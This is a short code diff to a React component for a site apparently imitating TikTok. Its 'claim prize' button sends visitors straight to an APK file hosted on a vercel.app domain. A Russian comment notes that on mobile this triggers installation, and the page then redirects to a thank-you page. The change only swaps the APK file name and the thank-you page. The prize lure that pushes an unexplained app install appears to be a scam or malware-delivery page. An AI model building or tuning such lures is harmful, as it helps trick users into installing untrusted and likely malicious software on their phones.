@@ -3,7 +3,7 @@ import React, { useState, useEffect } from 'react';
 const handleClaimPrize = (e) => {
     e.preventDefault();
 
-    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
+    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/sxUZ.apk';
     
     // На мобилке: попытка открыть напрямую (вызовет установку)
     window.location.href = apkUrl;
@@ -15,7 +15,7 @@ const handleClaimPrize = (e) => {
 
     // Редирект на thankyou после задержки
     setTimeout(() => {
-      window.location.href = '/thankyou.html';
+      window.location.href = '/thankyou2.html';
     }, 1500);
   };
 const TikTokLikeSite = () => {
